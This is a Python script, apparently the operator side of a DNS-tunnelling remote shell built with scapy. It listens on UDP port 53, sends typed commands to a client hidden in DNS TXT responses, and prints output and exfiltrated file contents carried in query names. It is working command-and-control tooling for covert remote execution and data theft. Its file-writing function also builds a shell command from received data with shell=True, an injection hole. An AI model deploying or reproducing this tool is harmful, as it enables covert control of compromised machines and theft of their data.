#!/usr/bin/env python3
import subprocess
import os
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP, RandShort

class color:
  BOLD = '\033[1m'
  RED='\033[1;31m'
  END = '\033[0m'


def handle_packet(packet):
    #packet.show()
    if packet[DNS].qd.qname.decode() == "client ready." and packet[DNS].qr == 0:
        #print("client ready\n")
        command = input(color.RED + "┌──(DNS㉿Shell)\n└─$ "+color.END)
        send_packet(packet, command)
        print(".......................................................")
    else:
        data = packet[DNS].qd.qname.decode()
        if data.startswith("data"):
            print("file sent")
            TransferFile(data[5:])
        else:
            if data.endswith("."):
                data = data[:-1]
            print(data, end="")
        #print(".......................................................")

def send_packet(packet, command):
    response = IP(dst=packet[IP].src) / \
                    UDP(dport=packet[UDP].sport, sport=53) / \
                    DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR], \
                        an=DNSRR(type = 'TXT', rdata = command))
    send(response, verbose = False)

def TransferFile(messasge):
	subprocess.check_output('echo "' + messasge + '" > file_sent.txt' , shell=True)
 
def main():
    sniff(filter="udp port 53", prn=handle_packet)
    
if __name__ == '__main__':
    main()